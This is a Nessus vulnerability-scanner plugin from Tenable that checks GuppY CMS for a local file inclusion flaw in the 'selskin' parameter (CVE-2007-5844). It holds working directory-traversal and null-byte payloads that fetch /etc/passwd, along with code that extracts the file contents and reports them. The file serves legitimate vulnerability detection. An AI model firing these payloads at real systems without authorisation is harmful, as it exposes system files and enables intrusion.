#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(27620);
  script_version("$Revision: 1.13 $");

  script_cve_id("CVE-2007-5844");
  script_bugtraq_id(26315);
  script_osvdb_id(38491);
  script_xref(name:"EDB-ID", value:"4602");

  script_name(english:"GuppY inc/includes.inc selskin Parameter Traversal Local File Inclusion");
  script_summary(english:"Tries to read a local file with GuppY");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is susceptible
to local and remote file include attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host is running GuppY, a content management system written
in PHP. 

The version of GuppY installed on the remote host fails to sanitize
user input to the 'selskin' parameter before using it to include PHP
code.  Regardless of PHP's 'register_globals' setting, an
unauthenticated, remote attacker may be able to exploit this issue to
view arbitrary files on the remote host or to execute arbitrary PHP
code, possibly taken from third-party hosts. 

Note that successful exploitation of the remote file include issue
requires that PHP's 'magic_quotes_gpc' setting be disabled." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:W/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(22);
 script_set_attribute(attribute:"plugin_publication_date", value: "2007/11/05");
 script_set_attribute(attribute:"vuln_publication_date", value: "2007/11/03");
 script_cvs_date("$Date: 2011/08/23 19:57:48 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2011 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);

file = "/etc/passwd";
if (thorough_tests) 
{
  exploits = make_list(
    string("../inc/boxleft.inc%00&xposbox[L][]=", file, "%00"),
    string("../../../../../../../../../..", file, "%00")
  );
}
else 
{
  exploits = make_list(
    string("../inc/boxleft.inc%00&xposbox[L][]=", file, "%00")
  );
}

# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/guppy", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  foreach exploit (exploits)
  {
    # Try to retrieve a local file.
    exploit = str_replace(find:'/', replace:"%2F", string:exploit);

    w = http_send_recv3(method:"GET", item:string(dir, "/index.php?selskin=", exploit), port:port);
    if (isnull(w)) exit(1, "the web server did not answer");
    res = w[2];

    # There's a problem if...
    if (
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error because magic_quotes was enabled or...
      string("main(", file, ".inc): failed to open stream") >< res ||
      # we get an error claiming the file doesn't exist or...
      string("main(", file, "): failed to open stream: No such file") >< res ||
      # we get an error about open_basedir restriction.
      string("open_basedir restriction in effect. File(", file) >< res
    )
    {
      if (egrep(string:res, pattern:"root:.*:0:[01]:"))
      {
        contents = res - strstr(res, "<!DOCTYPE");
        if ('</div' >< contents) contents = contents - strstr(contents, '</div');
        if ('<div ' >< contents && '>' >< contents) contents = strstr(contents, '>') - '>';
      }
      else contents = "";

      if (contents)
      {
        report = string(
          "\n",
          "Here are the contents of the file '/etc/passwd' that Nessus\n",
          "was able to read from the remote host :\n",
          "\n",
          contents
        );
        security_hole(port:port, extra:report);
      }
      else security_hole(port);

      exit(0);
    }
  }
}
